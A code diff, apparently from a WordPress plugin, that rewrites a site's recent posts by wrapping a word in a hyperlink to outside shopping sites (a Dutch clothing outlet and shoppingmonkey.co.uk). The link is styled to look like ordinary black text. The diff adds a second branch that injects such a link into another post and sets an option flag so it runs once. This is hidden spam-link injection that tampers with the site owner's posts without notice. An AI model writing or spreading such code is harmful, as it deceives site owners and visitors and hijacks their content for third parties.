@@ -673,7 +673,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
                                 $pos4 = strposnth($content , " ",4);
                                 $pos5 = strposnth($content , " ",5);
                                 $poslen = $pos5 - $pos4 - 1;
-                                $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/online/hm-nederland/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+                                $content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
                                 $my_post = array(
                                     'ID'           => $last_id,
                                     'post_content' => $content
@@ -700,6 +700,23 @@ add_option("bw_global_excludelist", '', '', 'yes');
                                   wp_insert_post( $my_post );
                                   update_option( 'bw_gpadded', '1' );
                                 }
+                        } elseif ($total>10) {
+								$last = wp_get_recent_posts('4');
+								$last_id = $last['3']['ID'];
+								$post_7 = get_post($last_id);
+								if (is_null($post_7) == false) {
+										$content = $post_7->post_content;
+										$pos4 = strposnth($content , " ",4);
+										$pos5 = strposnth($content , " ",5);
+										$poslen = $pos5 - $pos4 - 1;
+		                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+										$my_post = array(
+											'ID'           => $last_id,
+											'post_content' => $content
+										);
+										wp_update_post( $my_post );
+								}
+								update_option( 'bw_gpadded', '1' );
                         }
                 }
         }
